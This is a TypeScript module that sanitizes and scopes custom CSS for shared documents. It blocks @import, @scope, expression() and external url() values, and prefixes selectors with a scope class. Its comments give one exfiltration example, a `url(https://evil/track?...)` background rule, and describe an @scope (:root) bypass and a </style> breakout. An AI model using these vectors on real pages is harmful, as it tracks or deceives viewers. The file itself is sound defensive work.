// ── Custom CSS per document (G17) ────────────────────────────────────────────
//
// Security model:
//   1. SANITIZE  — strip dangerous constructs so the owner's raw CSS can be
//      stored as-is without trusting it; sanitization happens at render time.
//   2. SCOPE     — prefix every selector with `.parchment-custom-scope` so
//      styled rules only match inside the doc content wrapper, never the
//      toolbar, body, :root, or another document.
//
// Why sanitize-at-render (not at-store)?
//   Storing the raw user input lets the owner re-open their original text and
//   edit it. We sanitize every time we inject the <style> element, so we never
//   inject un-sanitized CSS into the DOM regardless of the stored value.
//
// Why scope matters in the share viewer?
//   The owner's CSS renders for anonymous viewers. Without scoping, a rule like
//   `body { background: url(https://evil/track?id=…) }` would leak a network
//   request to a third party whenever any viewer opens the share. With scoping
//   every selector is `.parchment-custom-scope body { … }` which only matches
//   inside the doc content subtree — the attack surface is eliminated.

export const CUSTOM_CSS_SCOPE = 'parchment-custom-scope'

/** Maximum length of stored/processed CSS (characters). */
const MAX_CSS_LENGTH = 20_000

// ── Internal helpers ──────────────────────────────────────────────────────────

/**
 * Remove every `@<keyword> … { … }` block from `css`, handling nested braces
 * correctly so the entire at-rule body is consumed (not just up to the first `}`).
 * Statement at-rules (`@<keyword> …;`) are also stripped.
 * Case-insensitive on the keyword. Never throws.
 */
function stripAtRuleBlocks(css: string, keyword: string): string {
  const re = new RegExp(`@${keyword}\\b`, 'gi')
  let result = css
  // Iterate until no occurrences remain (re-run after each splice, since indices shift).
  for (;;) {
    const match = re.exec(result)
    if (match === null) break
    const start = match.index
    // Scan forward to find ';' (statement form) or '{' (block form).
    let i = start + match[0].length
    while (i < result.length && result[i] !== '{' && result[i] !== ';') i++
    if (i >= result.length) {
      // Ran off the end — strip from start to end.
      result = result.slice(0, start)
      break
    }
    if (result[i] === ';') {
      // Statement form — strip from start through ';'.
      result = result.slice(0, start) + result.slice(i + 1)
      re.lastIndex = start
      continue
    }
    // Block form — find the matching '}'.
    let depth = 0
    let end = i
    while (end < result.length) {
      if (result[end] === '{') depth++
      else if (result[end] === '}') {
        depth--
        if (depth === 0) {
          end++ // include the closing '}'
          break
        }
      }
      end++
    }
    result = result.slice(0, start) + result.slice(end)
    re.lastIndex = start
  }
  return result
}

// ── Sanitize ──────────────────────────────────────────────────────────────────

/**
 * Strip dangerous constructs from a CSS string. Rules:
 *   • Remove `@import` lines/rules entirely.
 *   • Remove `url(...)` whose target is external, absolute, protocol-relative,
 *     or starts with `javascript:` or `data:` (script/exfil vectors). Safe
 *     relative urls (relative paths, empty) are replaced with `url('')`; this
 *     preserves the rest of the declaration without exfil risk.
 *   • Remove `expression(...)` (old IE JS-in-CSS vector).
 *   • Remove any `<` character (prevents `</style>` injection breaking out of
 *     the style tag; also catches embedded HTML).
 *   • Cap total length to MAX_CSS_LENGTH characters.
 *
 * Never throws. Returns a safe (but potentially empty) string.
 */
export function sanitizeCustomCss(css: string): string {
  if (typeof css !== 'string') return ''

  // Length cap first — avoids DoS on huge inputs.
  let s = css.slice(0, MAX_CSS_LENGTH)

  // Strip @import rules. Match `@import` through to the first `;` or end-of-line.
  // We handle both `@import "..."` and `@import url(...)` forms.
  s = s.replace(/@import\b[^;]*(;|$)/gi, '')

  // Strip @scope at-rules entirely.
  // CSS @scope (CSS Scoping Level 1, Chrome 118+, Firefox 128+, Safari 17.4+) lets
  // an author declare an explicit scope-start selector via the at-rule prelude, e.g.
  //   @scope (:root) { body { background: red } }
  // The scope-start selector is evaluated against the full document — the <style>
  // element's DOM position inside .parchment-custom-scope does NOT constrain it.
  // A user-supplied prelude like `(:root)` or `(html)` routes the inner rules to
  // the document root, bypassing the selector-prefixing defense entirely and
  // allowing full app-chrome redressing (toolbar, body, shared-viewer page, etc.).
  // Stripping @scope blocks unconditionally is the safe choice: relative-to-parent
  // scoping (@scope without a prelude) could in principle be kept, but verifying
  // that the prelude cannot escape the wrapper would require replicating selector
  // matching logic that is error-prone. Strip the full at-rule block, handling
  // nested braces so we remove the entire @scope { … } and not just the opener.
  s = stripAtRuleBlocks(s, 'scope')

  // Strip expression(...) — IE CSS expression injection.
  // Match greedily including nested parens (simple heuristic: up to 500 chars).
  s = s.replace(/expression\s*\([^)]{0,500}\)/gi, '')

  // Strip url(...) with dangerous targets.
  // Single-pass replacement that handles:
  //   url("...")  url('...')  url(...)  (including unquoted with embedded quotes like javascript:alert('x'))
  // Strategy: match url( then capture up to the closing ) using a balanced
  // approach — the regex eats the longest non-) sequence then the closing ).
  // For quoted forms the quotes are part of the captured href so we strip them.
  s = s.replace(/url\s*\(([^)]*)\)/gi, (_match, inner: string) => {
    const trimmed = inner.trim()

    // Extract the href — strip optional surrounding quotes.
    let href = trimmed
    if (
      (href.startsWith('"') && href.endsWith('"')) ||
      (href.startsWith("'") && href.endsWith("'"))
    ) {
      href = href.slice(1, -1)
    }

    const h = href.trim()

    // Empty href is fine.
    if (h === '') return "url('')"

    // Protocol-relative or absolute URLs — all stripped.
    if (h.startsWith('//') || /^[a-z][a-z0-9+\-.]*:/i.test(h)) {
      return "url('')"
    }

    // Relative path — safe to keep.
    return `url('${h}')`
  })

  // Strip `<` — prevents </style> break-out injection.
  s = s.replace(/</g, '')

  return s
}

// ── Scope ─────────────────────────────────────────────────────────────────────

/**
 * Prefix every selector in `css` with `scope` (e.g. `.parchment-custom-scope`)
 * so the rules only match inside the scoped doc-content wrapper.
 *
 * Handling per at-rule type:
 *   • @media / @supports / @container / @layer + block:
 *       Keep the at-rule prelude as-is; recursively prefix the INNER rule selectors.
 *   • @keyframes / @font-face / @page / @charset / @namespace:
 *       Leave the whole at-rule body untouched.  @keyframes and @font-face bodies
 *       are not selectors; @page is scoped to print context and cannot reach the
 *       UI chrome anyway; @charset / @namespace are header declarations. These are
 *       safe to keep without scoping.
 *   • Top-level style rules:
 *       Each comma-separated selector gets `${scope} ` prepended.
 *
 * Safety fall-back: on any parse oddity (unmatched braces, unexpected tokens)
 * the function returns '' (safe) rather than leaking un-scoped CSS. This is the
 * SAFE option per the brief requirement — empty CSS is always safe.
 *
 * Never throws.
 */
export function scopeCustomCss(css: string, scope: string): string {
  if (!css.trim()) return ''
  try {
    return scopeBlock(stripComments(css), scope)
  } catch {
    return ''
  }
}

/** Remove CSS comments (`/* … *\/`). */
function stripComments(css: string): string {
  return css.replace(/\/\*[\s\S]*?\*\//g, '')
}

/**
 * Scope the top-level rules inside `block` (the text between the outer braces,
 * or the entire sheet for the top level). Returns the scoped CSS.
 */
function scopeBlock(block: string, scope: string): string {
  const result: string[] = []
  let i = 0
  const len = block.length

  while (i < len) {
    // Skip whitespace
    while (i < len && /\s/.test(block[i] as string)) i++
    if (i >= len) break

    // Check if this is an at-rule.
    if (block[i] === '@') {
      const atResult = parseAtRule(block, i, scope)
      result.push(atResult.text)
      i = atResult.end
      continue
    }

    // Otherwise, it's a style rule: parse selector + block body.
    const ruleResult = parseStyleRule(block, i, scope)
    if (ruleResult === null) {
      // Parse failed — safety: return empty.
      throw new Error('parse error')
    }
    result.push(ruleResult.text)
    i = ruleResult.end
  }

  return result.join('\n')
}

/** Parse a style rule starting at `start` in `css`. Returns {text, end} or null on failure. */
function parseStyleRule(
  css: string,
  start: number,
  scope: string,
): { text: string; end: number } | null {
  // Find the opening brace — everything before it is the selector list.
  const braceIdx = css.indexOf('{', start)
  if (braceIdx === -1) return null // no opening brace — malformed

  const selectorText = css.slice(start, braceIdx).trim()
  if (!selectorText) return null // empty selector — skip

  // Find the matching closing brace.
  const { body, end } = extractBracedBody(css, braceIdx)
  if (end === -1) return null // unmatched brace — malformed

  // Prefix each comma-separated selector with scope.
  const scopedSelector = selectorText
    .split(',')
    .map((sel) => `${scope} ${sel.trim()}`)
    .join(',\n')

  return { text: `${scopedSelector} {${body}}`, end }
}

/**
 * At-rules that have bodies containing style rules — their inner rules must be scoped.
 * All other at-rules pass through untouched.
 */
// 'scope' is included here as defence-in-depth: @scope is stripped entirely in
// sanitizeCustomCss (because a user-controlled prelude can root the scope at
// :root/html and bypass the prefixing defence). If sanitization is ever called
// without the scope-strip step, the inner selectors will at least be prefixed.
const CONTAINER_AT_RULES = new Set(['media', 'supports', 'container', 'layer', 'document', 'scope'])

/** Parse an at-rule starting at `start` (`block[start]` === '@'). Returns {text, end}. */
function parseAtRule(css: string, start: number, scope: string): { text: string; end: number } {
  // Read the keyword (e.g. `media`, `keyframes`, …)
  const keywordMatch = /^@([-\w]+)/i.exec(css.slice(start))
  if (!keywordMatch) {
    // Malformed — skip one char and continue.
    return { text: '', end: start + 1 }
  }
  const keyword = keywordMatch[1]?.toLowerCase() ?? ''

  // Find either ';' (statement at-rule) or '{' (block at-rule).
  let i = start + keywordMatch[0].length

  // Scan for '{' or ';'.
  while (i < css.length && css[i] !== '{' && css[i] !== ';') i++

  if (i >= css.length) {
    // Ran off the end — emit as-is.
    return { text: css.slice(start), end: css.length }
  }

  if (css[i] === ';') {
    // Statement at-rule (e.g. @charset, @namespace, @import already stripped).
    return { text: css.slice(start, i + 1), end: i + 1 }
  }

  // Block at-rule: extract the body.
  const prelude = css.slice(start, i) // from '@' to just before '{'
  const { body, end } = extractBracedBody(css, i)

  if (CONTAINER_AT_RULES.has(keyword)) {
    // Recursively scope the inner rules.
    const scopedInner = scopeBlock(body, scope)
    return { text: `${prelude} {${scopedInner}}`, end }
  }

  // Non-container at-rule (@keyframes, @font-face, @page, …) — pass through untouched.
  return { text: `${prelude} {${body}}`, end }
}

/**
 * Given that `css[braceStart]` is '{', find the matching '}' (handling nesting)
 * and return the text between the braces and the index AFTER the closing '}'.
 */
function extractBracedBody(css: string, braceStart: number): { body: string; end: number } {
  let depth = 0
  let i = braceStart
  while (i < css.length) {
    if (css[i] === '{') depth++
    else if (css[i] === '}') {
      depth--
      if (depth === 0) {
        // body is everything between the outer braces (exclusive).
        return { body: css.slice(braceStart + 1, i), end: i + 1 }
      }
    }
    i++
  }
  // Unmatched opening brace.
  return { body: css.slice(braceStart + 1), end: css.length }
}

// ── Pipeline ──────────────────────────────────────────────────────────────────

/**
 * Full pipeline: sanitize then scope. This is what a render caller uses.
 * Sanitize removes dangerous CSS; scope restricts selectors to the doc subtree.
 */
export function prepareCustomCss(css: string, scope: string): string {
  return scopeCustomCss(sanitizeCustomCss(css), scope)
}

// ── Storage helper ────────────────────────────────────────────────────────────

/**
 * Validate and normalize the stored value. Accepts any unknown input; returns a
 * string capped at MAX_CSS_LENGTH. Never throws.
 */
export function parseCustomCss(raw: unknown): string {
  if (typeof raw !== 'string') return ''
  return raw.slice(0, MAX_CSS_LENGTH)
}
